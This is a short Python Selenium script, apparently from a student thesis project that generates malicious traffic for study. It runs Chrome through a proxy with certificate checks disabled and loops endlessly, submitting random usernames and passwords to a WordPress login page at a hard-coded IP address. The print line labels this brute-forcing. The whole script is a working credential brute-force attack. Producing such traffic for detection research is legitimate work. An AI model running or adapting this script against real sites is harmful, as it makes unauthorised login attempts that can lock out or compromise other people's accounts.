from selenium import webdriver
from selenium.webdriver.common.by import By
import random
import time

#IMPORT FOLDER OF THE MODULES
import sys
sys.path.extend(['/home/expresidentz/Desktop/skripsi-malicious-traffics-unhas/benign/register',
                 '/home/expresidentz/Desktop/skripsi-malicious-traffics-unhas/'])

#MODULES
from EmailMaker import NamesPickRandom
from PasswordMaker import PasswordPickRandom
from ProxyTest import ProxyTester

proxy = ProxyTester()
options = webdriver.ChromeOptions() 
print(f"Starting chrome with {proxy}")
options.add_argument(f'--proxy-server={proxy}')
options.add_argument("--ignore-certificate-errors")
options.add_argument("--start-maximized")
driver = webdriver.Chrome(options=options)

# driver.set_window_position(2000, 0)
driver.get("https://103.185.193.35/wp-login.php")
driver.implicitly_wait(2)

i = 0
while True:
    print("Bruteforcing #{i}")
    driver.find_element(by=By.ID, value="user_login").send_keys(NamesPickRandom())
    time.sleep(1)
    driver.find_element(by=By.ID, value="user_pass").send_keys(PasswordPickRandom())
    time.sleep(1)
    driver.find_element(by=By.ID, value="wp-submit").click()
    time.sleep(1)
    i = i + 1

driver.quit()
